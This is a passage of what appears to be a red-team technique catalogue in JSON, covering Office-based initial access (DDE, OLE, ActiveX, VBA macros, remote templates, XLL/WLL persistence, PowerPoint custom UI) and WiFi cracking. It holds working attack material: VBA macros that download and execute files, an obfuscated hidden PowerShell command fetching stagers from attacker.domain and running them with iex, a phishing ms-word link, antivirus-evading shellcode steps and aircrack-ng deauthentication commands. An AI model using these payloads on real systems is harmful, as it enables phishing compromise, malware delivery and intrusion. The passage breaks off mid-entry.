        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "fc159295-35c8-41ed-bf1a-6ceb259df518",
                "name": "Craft DDE Payload",
                "description": "Create a Dynamic Data Exchange (DDE) payload in Excel that executes a specified command or script.",
                "requirements": {},
                "results": [
                    "MS16-032 (DDE):PAYLOAD:CRAFTED"
                ]
            },
            {
                "id": "62bc1dd9-294e-4268-a81a-8ce60738f00b",
                "name": "Embed Payload in Document",
                "description": "Embed the crafted DDE payload into an Excel or Office document to prepare it for execution.",
                "requirements": {},
                "results": [
                    "MS16-032 (DDE):PAYLOAD:EMBEDDED"
                ]
            },
            {
                "id": "43093e8e-930f-4aa2-9e1d-6964597067c4",
                "name": "Test Payload Execution",
                "description": "Open the document on a test system to verify that the payload executes successfully.",
                "requirements": {},
                "results": [
                    "MS16-032 (DDE):PAYLOAD:TESTED"
                ]
            }
        ]
    },
    {
        "id": "2e4f5fac-80a7-4250-885d-d01f3d794462",
        "name": "Office Links",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Office-handeld Links",
        "content": "# Office Links\n\nWhen a user clicks on an HTML page having the following format, Microsoft Word will be run to handle the opening of the served document. Links like that could be misused for phishing purposes.\n\n```html\n<html>\n    <a href=\"ms-word:nft|u|http://attacker.domain/malicious.docx\">Click Me</a>\n</html>\n```\n\n## Tools\n########\n########",
        "category": "Office",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "bd7a0282-a0ee-432b-a9d2-cad5fd322a04",
                "name": "Generate Malicious Word Document",
                "description": "Create a Word document with embedded macros or payloads that execute commands upon opening. Use tools like Metasploit or custom scripting.",
                "requirements": {},
                "results": [
                    "OFFICE LINKS:DOCUMENT:GENERATED"
                ]
            },
            {
                "id": "51474be1-3684-484b-8818-872edd185f23",
                "name": "Write HTML with ms-word Protocol",
                "description": "Craft an HTML file containing a hyperlink formatted with the `ms-word` protocol pointing to the hosted malicious document.",
                "requirements": {},
                "results": [
                    "OFFICE LINKS:HTML:CREATED"
                ]
            },
            {
                "id": "7fac269e-2311-4819-9924-4f1eb89d8248",
                "name": "Host Malicious Document on Server",
                "description": "Deploy the malicious Word document to a server accessible via the link. Configure the server to handle requests properly.",
                "requirements": {},
                "results": [
                    "OFFICE LINKS:DOCUMENT:HOSTED"
                ]
            },
            {
                "id": "0824d03b-382d-4b0d-bd1d-60b36e2be6cc",
                "name": "Validate HTML Link Behavior",
                "description": "Click the link in a controlled environment to confirm that it opens the document in Word without alerts.",
                "requirements": {},
                "results": [
                    "OFFICE LINKS:LINK:TESTED"
                ]
            },
            {
                "id": "5af85ffd-e48c-4bf9-b386-b442970a08b3",
                "name": "Confirm Payload Execution",
                "description": "Monitor the test environment to ensure that the payload in the Word document executes as intended.",
                "requirements": {},
                "results": [
                    "OFFICE LINKS:PAYLOAD:CONFIRMED"
                ]
            }
        ]
    },
    {
        "id": "2ca0631d-690f-4343-a033-065aabf2d8eb",
        "name": "OLE",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Object Linking and Embedding Objects in case macros are restricted.",
        "content": "# OLE (Object Linking and Embedding Objects)\nObject Linking and Embedding(OLE) is a proprietary technology developed by Microsoft that allows embedding and linking to documents and other objects.\nFor example, a user can embed a spreadsheet (which is data that belongs to the spreadsheet application) in a word-processing document.\nWhen the word-processing application displays the document to the user, it can establish a connection and can interact with the spreadsheet application to display the spreadsheet data to the user\n\nEmbed for example:\n* Malicious Office documents\n* VBS files \n* JS files \n* EXE files \n* HTA files \n* CHM files\n\nCustomize both the extension and the icon\n\n## Payload\nInsert > Object > object type list choose package > choose file > customize filename + extension + icon\n\n## Execution\nAutotrigger via custom automation\nChoose OLE object to embed > Animations > Add Navigation > OLE Action verbs > Activate Contents\nAnimation tab > Animation Pane > navigate to the Animation Pane > choose object > right side down arrow = dropdown of the Object > Start after previous\n\n\n## Tools\n########\n########",
        "category": "Office",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "1db297c1-c390-4c34-b116-9dab8b89e015",
                "name": "Create OLE Object",
                "description": "Use the 'Insert > Object' option in Office to embed a malicious file as an OLE object.",
                "requirements": {},
                "results": [
                    "OLE:OBJECT:CREATED"
                ]
            },
            {
                "id": "d881dfe3-1f42-4015-ab57-26ae72924f7a",
                "name": "Customize Object Properties",
                "description": "Modify the filename, extension, and icon of the OLE object to make it less suspicious.",
                "requirements": {},
                "results": [
                    "OLE:PROPERTIES:CUSTOMIZED"
                ]
            },
            {
                "id": "ee90d477-8fa9-4b93-a119-e0fbe7838551",
                "name": "Set Automation Trigger",
                "description": "Configure automation settings in Office to execute the OLE object when the document is opened.",
                "requirements": {},
                "results": [
                    "OLE:TRIGGER:CONFIGURED"
                ]
            },
            {
                "id": "6a789ab1-610a-4552-8644-ad7958815700",
                "name": "Test OLE Execution",
                "description": "Open the document in a test environment to ensure that the OLE object executes as intended.",
                "requirements": {},
                "results": [
                    "OLE:EXECUTION:TESTED"
                ]
            }
        ]
    },
    {
        "id": "9e1695c5-c27b-45f5-a573-5a3449fb8ca8",
        "name": "ActiveX controls",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "Using ActiveX controls in order to trigger execution via phishing",
        "content": "# ActiveX controls for macro execution\n\n\n\n\n## Store Payload\n\n* File -> Options -> Customize Ribbon -> Add developer tab\n* Developer tab -> Controls -> Legacy Tools -> More Options\n* More infos via here: http://www.greyhathacker.net/?p=948\n\n## Autorun\n\n| ActiveX Control | Subroutine name |\n| --------------- | --------------- |\n| Microsoft Forms 2.0 Frame | Frame1_Layout |\n| Microsoft Forms 2.0 MultiPage | MultiPage1_Layout |\n| Microsoft ImageComboBox Control, version 6.0 | ImageCombo21_Change |\n| Microsoft InkEdit Control | InkEdit1_GotFocus |\n| Microsoft InkPicture Control | InkPicture1_Painted, InkPicture1_Painting, InkPicture1_Resize |\n| System Monitor Control | SystemMonitor1_GotFocus, SystemMonitor1_LostFocus |\n| Microsoft Web Browser | WebBrowser1_BeforeNavigate2, WebBrowser1_BeforeScriptExecute, WebBrowser1_DocumentComplete, WebBrowser1_DownloadBegin, WebBrowser1_DownloadComplete, WebBrowser1_FileDownload, WebBrowser1_NavigateComplete2, WebBrowser1_NavigateError, WebBrowser1_ProgressChange, WebBrowser1_PropertyChange, WebBrowser1_SetSecureLockIcon, WebBrowser1_StatusTextChange, WebBrowser1_TitleChange |\n\n## Execution\n\n1. Uses InkEdit - a subroutine coming from an ActiveX control to execute its code.\n2. downloading and executing an executable file using cmd.exe and PowerShell\n\n### On disc\n\n```vb\nSub InkEdit1_GotFocus()\nRun = Shell(\"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://trusted.domain/file.exe','file.exe');Start-Process 'file.exe'\", vbNormalFocus)\nEnd Sub\n```\n\n### In memory\n\n```vb\nSub InkEdit1_GotFocus()\n    Debugging\nEnd Sub\n\nPublic Function Debugging() As Variant\n    Const HIDDEN_WINDOW = 0\n    strComputer = \".\"\n    Set objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n    Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n    Set objConfig = objStartup.SpawnInstance_\n    objConfig.ShowWindow = HIDDEN_WINDOW\n    Set objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n    objProcess.Create \"powe\" & \"rshell.e\" & \"xe\" & \" -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager1.ps1') | iex } else {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager2.ps1') | iex}\"\nEnd Function\n```\n\n## Detection\n\n* Notification: \"Some active content has been disabled, Click here to find out more\"\n* On disc and in-memory execution\n\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "0832baf2-0b79-4919-88d1-3fc2ca4009ce",
                "name": "Enable Developer Tab",
                "description": "Activate the Developer tab in Office by navigating to 'File > Options > Customize Ribbon'.",
                "requirements": {},
                "results": [
                    "ACTIVEX CONTROLS:DEVELOPER TAB:ENABLED"
                ]
            },
            {
                "id": "690b74a5-d2e4-436f-bbde-8010febf6206",
                "name": "Embed ActiveX Control",
                "description": "Use the Developer tab to insert and configure an ActiveX control, such as InkEdit, to execute malicious code.",
                "requirements": {},
                "results": [
                    "ACTIVEX CONTROLS:CONTROL:EMBEDDED"
                ]
            },
            {
                "id": "4aaa459f-094c-4ac8-8752-0f3d48ddca70",
                "name": "Write Execution Code",
                "description": "Implement code in the ActiveX control to download and execute a payload using PowerShell.",
                "requirements": {},
                "results": [
                    "ACTIVEX CONTROLS:CODE:WRITTEN"
                ]
            },
            {
                "id": "e2f43cf9-0d6f-4932-91cc-7ecaa9983565",
                "name": "Test Control Execution",
                "description": "Run the Office document in a controlled environment to validate the execution of the ActiveX control.",
                "requirements": {},
                "results": [
                    "ACTIVEX CONTROLS:EXECUTION:TESTED"
                ]
            }
        ]
    },
    {
        "id": "97175308-e407-4747-8cad-77bce50b0c81",
        "name": "Clean Document",
        "phase": "01. Initial Access",
        "ttp": "T1000",
        "external": true,
        "description": "Clean document proerties in order to hide your details",
        "content": "# Clean Document Information\n\n**File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**. This is to prevent the username on your system being embedded in the document.\n\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "98c0f7d7-5df5-4b79-a6f0-74eff60080a3",
                "name": "Inspect Document Properties",
                "description": "Use the 'File > Info > Inspect Document' option to review embedded document properties and metadata.",
                "requirements": {},
                "results": [
                    "CLEAN DOCUMENT:PROPERTIES:INSPECTED"
                ]
            },
            {
                "id": "323bb6ba-9600-4e97-8c10-334eb0401edd",
                "name": "Remove Personal Information",
                "description": "Select 'Inspect' and then 'Remove All' to delete personal information from document metadata.",
                "requirements": {},
                "results": [
                    "CLEAN DOCUMENT:INFORMATION:REMOVED"
                ]
            },
            {
                "id": "5fc7ac20-6c65-4951-aca3-c0ee6c8b6222",
                "name": "Verify Cleaned Document",
                "description": "Reinspect the document to confirm that all personal and sensitive information has been successfully removed.",
                "requirements": {},
                "results": [
                    "CLEAN DOCUMENT:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "f9f9bae5-8877-40b0-8adc-0dfd1f81d6d0",
        "name": "Macros",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "Macros used for phishing attacks via office",
        "content": "# Macros\n\nMacros can be written in one of the following languages:\n* visual basic macros (excel 5.0)\n* excel 4.0\n\n| File extension | File Type           | Macros Permitted                                            |\n| -------------- | ------------------- | ----------------------------------------------------------- |\n| DOCX           | compressed document | No, with remote template                                    |\n| DOTX           | compressed template | No                                                          |\n| DOCM           | compressed document | Yes, Can be renamed and keep macro capabilities (RTF files) |\n| DOTM           | compressed template | Yes                                                         |\n\nRemote template in DOCX: File->Options->Add-Ins->Manage:Templates->Go\n\nIdentify associated filetypes:\n```\nassoc | findstr /i \u201cword\u201d\nassoc | findstr /i \u201cexcel\u201d\nassoc | findstr /i \u201cpowerp\u201d\n```\n\nInformation about macros\n* cross-platform\n* Sandboxed on macOS\n* direct WinAPI access\n* COM object access\n* GPOs applied per application\n* Access scripts (.accde), manfile, \n* It is possible to sign payloads\n* protected view since 2016\n\t* does not work for .slk, .one, .pub, .accde\n\t* still enable content (maros) required\n\t* change macro alert via AutoOpen / Document_Open() (https://www.greyhathacker.net/?tag=activex)\n\t* go legacy dialog: add the visibility=\"hidden\" attribute to the workbookView element in the xl/workbook.xml file\n\t* remote template injection, settings.xml.rels file inside the docx\n\t!(Images/RemoteTemplateInjection.png \"macro\")\n\t\n\t* winapi + com\n\t![winapi](/Images/macro-winapi-com-1.png \"winapi1\".png)\n\t![winapi1](/Images/macro-winapi-com-1.png \"winapi\".png)\n* OLE objects: can be embedded inside Office documents\n\t* .exe, .bat, .lnk, .hta, .vba, .js\n\t* there is a blocklist since 2016\n\n\n## Tools\n########\n########\n\n## [[VBad]]\n",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [
            "VBad"
        ],
        "steps": [
            {
                "id": "1bbbe22e-93f9-469f-a137-90c1b2429a12",
                "name": "Create Malicious Macro",
                "description": "Write a macro script using VBA to execute commands or download payloads upon activation.",
                "requirements": {},
                "results": [
                    "MACROS:SCRIPT:CREATED"
                ]
            },
            {
                "id": "f98a6c4f-b92f-4083-a3a0-2235771c61b7",
                "name": "Embed Macro in Document",
                "description": "Attach the malicious macro to a Word or Excel document in the VBA editor.",
                "requirements": {},
                "results": [
                    "MACROS:EMBEDDED"
                ]
            },
            {
                "id": "6027c35e-576b-4a53-90f6-6b3b163675b3",
                "name": "Configure Macro Execution Trigger",
                "description": "Set an execution trigger for the macro, such as AutoOpen or Document_Open().",
                "requirements": {},
                "results": [
                    "MACROS:TRIGGER:CONFIGURED"
                ]
            },
            {
                "id": "f65a9f7a-0109-42bb-ac32-91941d205d9b",
                "name": "Test Macro Execution",
                "description": "Open the document in a controlled environment to validate that the macro executes successfully.",
                "requirements": {},
                "results": [
                    "MACROS:EXECUTION:TESTED"
                ]
            }
        ]
    },
    {
        "id": "df05a83f-0203-450a-b074-21c56a5ae319",
        "name": "Remote Template Injection",
        "phase": "01. Initial Access",
        "ttp": "T1221",
        "external": true,
        "description": "Macros used for phishing attacks via office",
        "content": "Technique Remote Template Injection involves specific methods related to Macros used for phishing attacks via office.",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "eee299a2-5bdc-4cee-b9fe-584373877042",
                "name": "Create Malicious Template",
                "description": "Develop a malicious Word or Excel template containing the desired payload (e.g., VBA macro or embedded script).",
                "requirements": {},
                "results": [
                    "REMOTE TEMPLATE INJECTION:TEMPLATE:CREATED"
                ]
            },
            {
                "id": "e97e82ca-6398-42d5-b487-7b89e57fbd24",
                "name": "Host Template on Remote Server",
                "description": "Deploy the malicious template to a remote server, ensuring it is accessible via a unique URL.",
                "requirements": {},
                "results": [
                    "REMOTE TEMPLATE INJECTION:TEMPLATE:HOSTED"
                ]
            },
            {
                "id": "c5400385-cf85-4119-b369-e222381d04f7",
                "name": "Configure Document for Remote Template",
                "description": "Set the remote template URL in the document's settings via File > Options > Add-Ins > Manage: Templates.",
                "requirements": {},
                "results": [
                    "REMOTE TEMPLATE INJECTION:DOCUMENT:CONFIGURED"
                ]
            },
            {
                "id": "67389b4d-8548-48c6-8977-dc75a588a774",
                "name": "Validate Template Loading",
                "description": "Open the document to confirm that it successfully loads the remote template and executes the payload.",
                "requirements": {},
                "results": [
                    "REMOTE TEMPLATE INJECTION:VALIDATION:SUCCESSFUL"
                ]
            }
        ]
    },
    {
        "id": "56f2ec18-fc38-4502-9cb1-8d8278cf8e09",
        "name": "Shellcode Injection",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "VBA Shellcode injection",
        "content": "# Macro Shellcode injection\n\n#### Detection\nhttps://labs.mwrinfosecurity.com/assets/BlogFiles/one-template-to-rule-them-all-t2.pdf\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "70b87c3b-5099-4759-af72-0fd34baf11aa",
                "name": "Generate Encoded Shellcode",
                "description": "Create and encode the shellcode using msfvenom or similar tools to avoid detection by antivirus solutions.",
                "requirements": {},
                "results": [
                    "SHELLCODE INJECTION:SHELLCODE:GENERATED"
                ]
            },
            {
                "id": "894f09f2-426f-4b98-bb2b-ea12993c77e5",
                "name": "Write VBA Loader",
                "description": "Develop a VBA loader script that decodes and injects the shellcode into memory using API calls like VirtualAlloc and CreateThread.",
                "requirements": {},
                "results": [
                    "SHELLCODE INJECTION:LOADER:WRITTEN"
                ]
            },
            {
                "id": "bf3ed005-be47-4a2f-aa3d-8efbcf754e44",
                "name": "Embed Loader in Document",
                "description": "Attach the VBA loader to a Word or Excel document and configure it to run automatically on document open.",
                "requirements": {},
                "results": [
                    "SHELLCODE INJECTION:LOADER:EMBEDDED"
                ]
            },
            {
                "id": "8d3e0000-ec84-4028-9d5f-0ea06e8dc6b7",
                "name": "Test Shellcode Execution in Sandbox",
                "description": "Run the document in a sandboxed environment to verify that the shellcode executes and achieves its intended functionality.",
                "requirements": {},
                "results": [
                    "SHELLCODE INJECTION:EXECUTION:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "bea54459-bba3-4535-80a6-6ebacb32a3b9",
        "name": "VBA",
        "phase": "01. Initial Access",
        "ttp": "T1059.005",
        "external": true,
        "description": "VBA execution via Office",
        "content": "# VBA\nYou can create a macro in a Word document by going to **View > Macros > Create**.  Change the \"Macros in\" field from \"All active templates and documents\" to \"Document 1\".\n\nTrigger Functions\n* AutoOpen\n\n\nPoC.vb\n``````vb\nSub AutoOpen()\n\n  Dim Shell As Object\n  Set Shell = CreateObject(\"wscript.shell\")\n  Shell.Run \"calc\"\n\nEnd Sub\n``````\n\n#OPSEC Word spawning a process highly suspicious [[Parent-Process-Spoofing (PPS)]]\n\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "a5742fce-0f0f-4d15-bfe7-6fcc2d2fc1e8",
                "name": "Write Malicious VBA Macro",
                "description": "Create a VBA macro with commands to execute payloads or other actions. Example: use 'AutoOpen' as a trigger.",
                "requirements": {},
                "results": [
                    "VBA:MACRO:CREATED"
                ]
            },
            {
                "id": "f70afe7e-2ed3-4439-ae0c-67fb06cc9124",
                "name": "Embed Macro in Office Document",
                "description": "Attach the malicious VBA macro to a Word or Excel document via the VBA editor.",
                "requirements": {},
                "results": [
                    "VBA:MACRO:EMBEDDED"
                ]
            },
            {
                "id": "e0c615d6-3169-41f2-957c-8beb18e22492",
                "name": "Configure Execution Trigger",
                "description": "Set up triggers like 'AutoOpen' or 'Workbook_Open' to execute the macro automatically when the document is opened.",
                "requirements": {},
                "results": [
                    "VBA:TRIGGER:CONFIGURED"
                ]
            },
            {
                "id": "adfe27cc-5652-4f31-a1b1-a4558db1567f",
                "name": "Validate Macro Execution",
                "description": "Open the document in a controlled environment to ensure the macro executes as expected.",
                "requirements": {},
                "results": [
                    "VBA:EXECUTION:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "7484fee0-1307-4988-9180-50aa807f5f22",
        "name": "COM",
        "phase": "01. Initial Access",
        "ttp": "T1137.006",
        "external": true,
        "description": "Dropping an COM file into the STARTUP folder to archive persistence and execute code when Outlook being launched",
        "content": "## Tools\n########\n########",
        "category": "Excel",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Process Monitor",
            "PowerShell",
            "Invoke-DCOM",
            "Process Hacker"
        ],
        "steps": [
            {
                "id": "aa5f2dfd-9004-4fdf-b723-83505185c28e",
                "name": "Prepare Malicious COM Script",
                "description": "Write a COM script to execute code or payloads, ensuring it is compatible with the target environment.",
                "requirements": {},
                "results": [
                    "COM:SCRIPT:PREPARED"
                ]
            },
            {
                "id": "e157b71a-bb68-4e1b-8483-78756773bce8",
                "name": "Drop COM Script into Startup Folder",
                "description": "Deploy the malicious COM script into the target's Startup folder to enable persistence.",
                "requirements": {},
                "results": [
                    "COM:SCRIPT:DROPPED"
                ]
            },
            {
                "id": "a8dbccfa-d84a-4373-a425-fd103966e8e4",
                "name": "Simulate Application Launch",
                "description": "Launch the targeted application (e.g., Outlook) to verify that the COM script executes on startup.",
                "requirements": {},
                "results": [
                    "COM:SCRIPT:EXECUTION:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "a29d32b3-2e3e-44b5-8e75-5df624bd5deb",
        "name": "WLL",
        "phase": "01. Initial Access",
        "ttp": "T1137.006",
        "external": true,
        "description": "Dropping an WLL file into the STARTUP folder to archive persistence and execute code when WLL being launched",
        "content": "## Path\n> %appdata%\\Microsoft\\Word\\STARTUP\n\n\n## Tools\n########\n########",
        "category": "Excel",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "ab4428f0-962c-4d8a-9f65-77ceb8886dee",
                "name": "Prepare Malicious WLL File",
                "description": "Create a WLL (Word Add-in) file containing the payload to be executed when Word launches.",
                "requirements": {},
                "results": [
                    "WLL:FILE:PREPARED"
                ]
            },
            {
                "id": "5a53dacd-31e2-4cbe-ac14-6fd413150195",
                "name": "Deploy WLL File to Startup Folder",
                "description": "Copy the malicious WLL file to the Word startup folder: %appdata%\\Microsoft\\Word\\STARTUP.",
                "requirements": {},
                "results": [
                    "WLL:FILE:DEPLOYED"
                ]
            },
            {
                "id": "a1a6e01a-294c-4114-86bb-4ff46169b100",
                "name": "Verify Execution on Word Launch",
                "description": "Open Microsoft Word to confirm that the WLL file executes the embedded payload successfully.",
                "requirements": {},
                "results": [
                    "WLL:EXECUTION:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "9b754c7b-50bf-4052-a690-45a4dd4be2f3",
        "name": "XLL",
        "phase": "01. Initial Access",
        "ttp": "T1137.006",
        "external": true,
        "description": "Dropping an XLL file into the XLSTART folder to archive persistence and execute code when XLL being launched",
        "content": "## Path\n> %appdata%\\Microsoft\\Excel\\XLSTART\n\n## Tools\n########\n########",
        "category": "Excel",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "211270a7-1fef-4bfb-a7a5-22f645d23155",
                "name": "Prepare Malicious XLL File",
                "description": "Create an XLL (Excel Add-in) file containing the payload to be executed when Excel launches.",
                "requirements": {},
                "results": [
                    "XLL:FILE:PREPARED"
                ]
            },
            {
                "id": "fe20ef2c-be33-45fe-abcd-ed433c373df6",
                "name": "Deploy XLL File to Startup Folder",
                "description": "Copy the malicious XLL file to the Excel startup folder: %appdata%\\Microsoft\\Excel\\XLSTART.",
                "requirements": {},
                "results": [
                    "XLL:FILE:DEPLOYED"
                ]
            },
            {
                "id": "3dcf72d6-779d-4ba1-93c7-699fbaa509a0",
                "name": "Verify Execution on Excel Launch",
                "description": "Open Microsoft Excel to confirm that the XLL file executes the embedded payload successfully.",
                "requirements": {},
                "results": [
                    "XLL:EXECUTION:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "f89c3e5e-623f-4f14-9b97-21256c0ca971",
        "name": "Custom Actions",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "Short description for Custom Actions",
        "content": "# Macros on PowerPoint\n* Use \"Custom Actions\"\n    0. Activate Dev Tab (File->Options->Customize Ribbon)\n    1. Developer Tab\n    2. Visual Basic\n    3. Insert choose Model\n    4. Insert\n    5. Choose an item to associate the action with \n    6. \"Mouse Click\" or Mouse Over\n    7. Run macro\n\n* Office 2007 Custom UI\n    * Insert the module and save PowerPoint as a macro-supporting PowerPoint file\n    * Unzip the PowerPoint file\n    * Edit the _rels/.rels file to add the following line right before the last ```</Relationships>. <Relationship  Type=http://schemas.microsoft.com/office/2006/relationships/ui/extensibility Target=\u201c/customUI/customUI.xml\u201d Id=\u201dRd6e72c29d34a427e\u201d />```\n    * Create a new directory on the same level as the _rels directory called \"customUI\"\n    * Inside customUI directory create a customUI.xml containing ```<customUI xmlns=http://schemas.microsoft.com/office/2006/01/customui onLoad=\u201dname of your VBA module\u201d ></customUI>```\n    * Zip the whole directory and rename it to the filename you used to save the original PowerPoint presentation\n\n## Detection\n\n\n## Tools\n########\n########",
        "category": "PowerPoint",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "ca6ea250-5d31-4e05-a834-64a78e6b65be",
                "name": "Enable Developer Tab in PowerPoint",
                "description": "Activate the Developer tab in PowerPoint by navigating to 'File > Options > Customize Ribbon'.",
                "requirements": {},
                "results": [
                    "CUSTOM ACTIONS:DEVELOPER TAB:ENABLED"
                ]
            },
            {
                "id": "220abe40-18e8-4009-bd0d-3a418378899d",
                "name": "Create VBA Module",
                "description": "Insert a new VBA module and write code to execute commands or payloads on a specified trigger (e.g., Mouse Click).",
                "requirements": {},
                "results": [
                    "CUSTOM ACTIONS:MODULE:CREATED"
                ]
            },
            {
                "id": "20c957bb-ebe5-4102-bb0c-0f64ae478616",
                "name": "Assign Action to Slide Object",
                "description": "Link the VBA module to a slide object in PowerPoint using the Custom Actions feature under the Developer tab.",
                "requirements": {},
                "results": [
                    "CUSTOM ACTIONS:ACTION:ASSIGNED"
                ]
            },
            {
                "id": "150b492a-dc85-4a1e-900e-49c62b7a25b0",
                "name": "Validate Action Trigger",
                "description": "Run the PowerPoint presentation and interact with the object to ensure the VBA code executes as intended.",
                "requirements": {},
                "results": [
                    "CUSTOM ACTIONS:TRIGGER:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "f9b9cc06-dbda-46ff-ad6e-de0537990f81",
        "name": "Custom UI part",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "Short description for Custom UI part",
        "content": "Run the VBA module automatically as soon as the user enables macros.\n\n1. Insert the module you want and save the PowerPoint presentation as a macro supporting PowerPoint file type\n2. Unzip the PowerPoint file you saved\n3. Edit the _rels/.rels file to add the following line right before the last </ Relationships>.  \n`<Relationship Type=http://schemas.microsoft.com/office/2006/relationships/ui/extensibility Target=\u201c/customUI/customUI.xml\u201d Id=\u201dRd6e72c29d34a427e\u201d />`\n4. Create a new directory on the same level as the _rels directory called \u201ccustomUI\u201d.\n5. Inside customUI directory create a customUI.xml file containing the following.  \n`<customUI xmlns=http://schemas.microsoft.com/office/2006/01/customui onLoad=\u201dname of your VBA module\u201d ></customUI>`\n6. Zip the whole directory and rename it to the filename you used to save the original PowerPoint presentation\n\n\n\n## Tools\n########\n########",
        "category": "PowerPoint",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "24c99586-4733-4c01-abc9-737f5702b010",
                "name": "Modify PowerPoint .rels File",
                "description": "Edit the '_rels/.rels' file in the PowerPoint package to include a reference to a custom UI XML file.",
                "requirements": {},
                "results": [
                    "CUSTOM UI PART:RELS FILE:MODIFIED"
                ]
            },
            {
                "id": "60fc2c27-d420-4c24-8540-124fde780ac6",
                "name": "Create Custom UI XML",
                "description": "Develop a 'customUI.xml' file containing configuration to load a VBA module automatically upon opening the presentation.",
                "requirements": {},
                "results": [
                    "CUSTOM UI PART:XML:CREATED"
                ]
            },
            {
                "id": "0f582964-40c5-420d-8371-806dde6480e1",
                "name": "Repackage PowerPoint File",
                "description": "Compress the modified directory structure and rename it back to the original PowerPoint file format.",
                "requirements": {},
                "results": [
                    "CUSTOM UI PART:FILE:REPACKAGED"
                ]
            },
            {
                "id": "95d0434f-a39b-48c2-8a32-b29f850ab448",
                "name": "Validate Custom UI Execution",
                "description": "Open the modified PowerPoint file to ensure the VBA module loads and executes as intended.",
                "requirements": {},
                "results": [
                    "CUSTOM UI PART:EXECUTION:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "4b0592f0-8e38-4a9e-86a4-4289ff827885",
        "name": "WiFi crack",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Try to crack the WiFi in order to gain access to the internal network remotely",
        "content": "## Tools\n########\n########\n\n## [[aircrack-ng]]\n```java\n//Set wificard in monitor mode (monitor.sh)\nIfconfig\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> take wlan card name\nIfconfig name down\u00a0\u00a0\u00a0\u00a0 //runterfahren\nIfconfig name mode monitor\nIfconfig name up\nIwconfig name | grep Mode\n\n//Change MAC\n\n\n//Check if prozess interfering! IF KILL\nAirmon-ng check name\nKill 1312 (Networkmanager)\nKill\u00a017917 (dhclient)\nKill 1556, 1215, 1216\n\n//Netzwerk sniffen\nAirodump-ng name\nAirodumo -c [channel] -w [FILE] --bsssid [MAC]\nAirplay-ng -0 0 -a [MAC]              //deauthenticate dauerhaft\nAircrack-ng -w [word list] capture.cap\n\n//Change networkcard channel to Router channel\nAireplay-ng -0 0 -a [MAC] name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> get channel + MAC(bssid)\nIwconfig name channel 6\n```",
        "category": "Physical",
        "stealthy": false,
        "changes": [],
        "tools": [
            "aircrack-ng"
        ],
        "steps": [
            {
                "id": "93fec550-d59e-4539-9013-7a0202c9acf3",
                "name": "Set Wireless Card to Monitor Mode",
                "description": "Enable monitor mode on the wireless card using tools like airmon-ng to capture network traffic.",
                "requirements": {},
                "results": [
                    "WIFI CRACK:MONITOR MODE:ENABLED"
                ]
            },
            {
                "id": "c103c268-fb54-403f-b5c9-ebacd7d88d68",
                "name": "Capture Network Handshake",
                "description": "Use airodump-ng to capture the WPA/WPA2 handshake packets of the target network.",
                "requirements": {},
                "results": [
                    "WIFI CRACK:HANDSHAKE:CAPTURED"
                ]
            },
            {
                "id": "59d03e14-345f-45c0-ad82-b90d3cb6f82c",
                "name": "Launch Deauthentication Attack",
                "description": "Perform a deauthentication attack using aireplay-ng to force devices to reconnect and capture handshakes.",
                "requirements": {},
                "results": [
                    "WIFI CRACK:DEAUTH ATTACK:EXECUTED"
                ]
            },
            {
                "id": "16c4b500-74fa-4a40-a6ca-2a61c7634977",
                "name": "Crack Network Password",
                "description": "Run aircrack-ng with a wordlist to brute-force the captured handshake and retrieve the network password.",
                "requirements": {},
